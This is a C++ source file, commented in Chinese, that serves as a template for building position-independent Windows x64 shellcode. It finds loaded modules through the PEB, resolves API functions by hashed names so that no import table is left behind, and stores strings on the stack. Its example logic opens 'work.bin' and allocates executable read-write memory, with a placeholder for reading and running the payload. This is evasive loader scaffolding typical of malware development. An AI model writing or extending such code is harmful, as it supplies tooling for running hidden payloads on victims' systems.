#include <windows.h>
#include <intrin.h>

#pragma warning(disable : 28251)
#pragma warning(disable : 6001)
#pragma warning(disable : 4201)

constexpr DWORD Hash(const char* functionName) {
    DWORD hash = 0;
    while (*functionName) {
        hash = (hash * 138) + *functionName;
        functionName++;
    }
    return hash;
}

// 必要的 PEB 结构定义 (为了替代 ASM 硬编码偏移，确保稳定性)
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN BitField;
    PVOID Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, * PPEB;

// 简单的宽字符转小写哈希计算 (用于模块名匹配)
DWORD HashModule(PCWSTR ModuleName) {
    DWORD hash = 0;
    while (*ModuleName) {
        wchar_t c = *ModuleName;
        if (c >= 'A' && c <= 'Z') c += 32;
        hash = (hash * 138) + c;
        ModuleName++;
    }
    return hash;
}

// 获取 PEB (替代 x64.asm GetPEB64)
__forceinline PPEB GetPEB() {
    return (PPEB)__readgsqword(0x60);
}

// 获取模块基址 (替代 x64.asm GetKernel32/Ntdll)
HMODULE GetModuleBase(DWORD dwModuleHash) {
    PPEB pPeb = GetPEB();
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)pLdr->InLoadOrderModuleList.Flink;

    while (pDte->DllBase != NULL) {
        if (pDte->BaseDllName.Buffer != NULL) {
            if (HashModule(pDte->BaseDllName.Buffer) == dwModuleHash) {
                return (HMODULE)pDte->DllBase;
            }
        }
        pDte = (PLDR_DATA_TABLE_ENTRY)pDte->InLoadOrderLinks.Flink;
    }
    return NULL;
}

PVOID GetFuncAddrByHash(HMODULE hModule, DWORD hash) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD pEAT = (PDWORD)((BYTE*)hModule + pExport->AddressOfFunctions);
    PDWORD pENT = (PDWORD)((BYTE*)hModule + pExport->AddressOfNames);
    PWORD pEIT = (PWORD)((BYTE*)hModule + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* szFuncName = (char*)((BYTE*)hModule + pENT[i]);
        if (Hash(szFuncName) == hash) {
            return (BYTE*)hModule + pEAT[pEIT[i]];
        }
    }
    return NULL;
}

// 在这里定义你需要的 API

// 定义需要的 DLL 哈希
constexpr auto HASH_KERNEL32 = Hash("kernel32.dll");
constexpr auto HASH_NTDLL = Hash("ntdll.dll");
// constexpr auto HASH_USER32 = Hash("user32.dll"); // 示例

typedef HANDLE(WINAPI* tCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* tReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* tCloseHandle)(HANDLE);
typedef VOID(WINAPI* tExitProcess)(UINT);
typedef int(WINAPI* tMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);

typedef NTSTATUS(NTAPI* tNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

typedef struct _API_TABLE {

    tCreateFileA CreateFileA;
    tReadFile    ReadFile;
    tCloseHandle CloseHandle;
    tExitProcess ExitProcess;

    tNtAllocateVirtualMemory NtAllocateVirtualMemory;

    // User32 (示例)
    // tMessageBoxA MessageBoxA;
} API_TABLE, * PAPI_TABLE;

// 在这里填写需要解析的函数
BOOL InitAPITable(PAPI_TABLE pApi) {
    HMODULE hKernel32 = GetModuleBase(HASH_KERNEL32);
    HMODULE hNtdll = GetModuleBase(HASH_NTDLL);

    if (!hKernel32 || !hNtdll) return FALSE;

    // 解析 Kernel32
    pApi->CreateFileA = (tCreateFileA)GetFuncAddrByHash(hKernel32, Hash("CreateFileA"));
    pApi->ReadFile = (tReadFile)GetFuncAddrByHash(hKernel32, Hash("ReadFile"));
    pApi->CloseHandle = (tCloseHandle)GetFuncAddrByHash(hKernel32, Hash("CloseHandle"));
    pApi->ExitProcess = (tExitProcess)GetFuncAddrByHash(hKernel32, Hash("ExitProcess"));

    pApi->NtAllocateVirtualMemory = (tNtAllocateVirtualMemory)GetFuncAddrByHash(hNtdll, Hash("NtAllocateVirtualMemory"));

    if (!pApi->CreateFileA || !pApi->NtAllocateVirtualMemory) return FALSE;

    return TRUE;
}
// PIC 逻辑

void UserLogic(PAPI_TABLE pApi) {
    // -----------------------------------------------------------
    // 1. 不要使用全局变量
    // 2. 字符串必须定义为栈数组 (Stack Strings)
    // 3. 不要直接调用系统 API，必须通过 pApi->调用
    // -----------------------------------------------------------

    // 示例：定义文件名 "work.bin"
    volatile char szFileName[] = { 'w', 'o', 'r', 'k', '.', 'b', 'i', 'n', 0 };

    // 示例逻辑：打开文件
    HANDLE hFile = pApi->CreateFileA((LPCSTR)szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        // 分配内存
        PVOID buffer = NULL;
        SIZE_T size = 1024;
        pApi->NtAllocateVirtualMemory((HANDLE)-1, &buffer, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        // ... 读取、执行等逻辑 ...

        pApi->CloseHandle(hFile);
    }

    // 结束 (在 Shellcode 中通常直接 ret，或者调用 ExitProcess)
    // pApi->ExitProcess(0); 
}

// Shellcode 入口点

#pragma code_seg(".text")
#pragma comment(linker, "/ENTRY:ShellcodeEntry")

extern "C" void ShellcodeEntry() {
    // 1. 栈对齐 (可选，但在某些复杂场景下推荐)
    // 2. 初始化 API 表
    API_TABLE Api;

    // 手动清零结构体 (避免链接 memset)
    char* p = (char*)&Api;
    for (int i = 0; i < sizeof(API_TABLE); i++) {
        p[i] = 0;
    }

    if (InitAPITable(&Api)) {
        // 3. 执行用户逻辑
        UserLogic(&Api);
    }
}